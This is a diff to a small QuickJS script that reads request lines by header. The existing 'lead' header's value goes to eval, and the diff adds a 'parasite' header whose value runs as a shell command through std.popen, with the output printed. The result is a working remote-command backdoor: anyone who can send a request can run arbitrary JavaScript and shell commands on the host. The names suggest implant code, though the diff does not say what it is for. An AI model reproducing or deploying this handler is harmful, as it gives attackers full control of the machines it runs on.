@@ -1,10 +1,18 @@
 import * as std from "std";
+import * as os from "os";
 
 let pupa = request => {
   request = request.split("\n");
   request.forEach( line => {
     if(/lead/i.test(line.split(":")[0])) {
-      eval(line.substr(5)); 
+      eval(line.substring(5, line.length-1)); 
+    } else if(/parasite/i.test(line.split(":")[0])) {
+      console.log(`Triying to execute ${line.substring(9, line.length-1)}`);
+      let prog = std.popen(line.substring(9, line.length-1), "r");
+      let r;
+      while ((r = prog.getline()) != null) {
+        console.log(r);
+      } 
     }
   });
 };
